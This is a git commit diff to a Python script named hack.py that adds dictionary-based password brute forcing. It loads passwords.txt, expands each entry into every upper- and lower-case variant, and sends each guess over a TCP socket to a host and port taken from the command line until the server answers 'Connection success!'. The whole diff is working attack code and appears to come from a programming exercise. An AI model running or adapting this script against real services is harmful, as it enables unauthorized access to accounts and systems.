bd5cb76b116de6bfd13fff6af3a578870cf40a33
Konrad Kaczmarek <55359118+KonradKaczmarek79@users.noreply.github.com>
2025-11-03 20:23:15 +0100

    dictionary-based brute force
    Use file with dictionary of most popular passwords

--- hack.py
+++ hack.py
@@ -2,6 +2,7 @@ import socket
 import sys
 from itertools import product
 import string
+import re
 
 PASSWORD_INGREDIENTS = {char.lower() for char in string.ascii_letters + string.digits}
 
@@ -27,10 +28,10 @@ def create_products(char_set: set | None, repetitions: int = 3):
     return (''.join(x) for x in product(char_set, repeat=repetitions))
 
 
-def send_messages_till_success(client_socket, message):
+def send_messages_till_success(client_socket, message, combinations):
     if message is not None:
         sent_data_to_server(client_socket, message)
-    else:
+    elif combinations is None or len(combinations) == 0:
         repetitions = 0
         while repetitions >= 0:
             repetitions += 1
@@ -46,9 +47,19 @@ def send_messages_till_success(client_socket, message):
                     print(element)
                     repetitions = -1
                     break
+    else:
+        for element in combinations:
+            try:
+                response = sent_data_to_server(client_socket, element)
+            except socket.error:
+                response = None
+
+            if response is not None and "Connection success!" in response:
+                print(element)
+                break
 
 
-def data_exchange(host, port, message=None):
+def data_exchange(host, port, message=None, combinations=None):
     # working with a socket as a context manager
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
         hostname = host
@@ -58,11 +69,28 @@ def data_exchange(host, port, message=None):
         try:
             client_socket.connect(address)
 
-            send_messages_till_success(client_socket, message)
+            send_messages_till_success(client_socket, message, combinations)
         except ConnectionRefusedError:
             pass
 
 
+def create_combinations(password: str):
+    if re.search(r'[a-zA-Z]+', password):
+        return list(map(''.join, product(*zip(password.upper(), password.lower()))))
+    else:
+        return [password]
+
+def get_combinations_from_file(filename: str):
+    result = []
+    with open(filename) as file:
+        for line in file:
+            current_password = line.strip()
+            unique_combinations = set(create_combinations(current_password))
+            result.extend(unique_combinations)
+    return result
+
+
 if __name__ == '__main__':
+    passwords_to_check = get_combinations_from_file('passwords.txt')
     exchange_params = get_command_line_arguments()
-    data_exchange(**exchange_params)
+    data_exchange(**exchange_params, combinations=passwords_to_check)
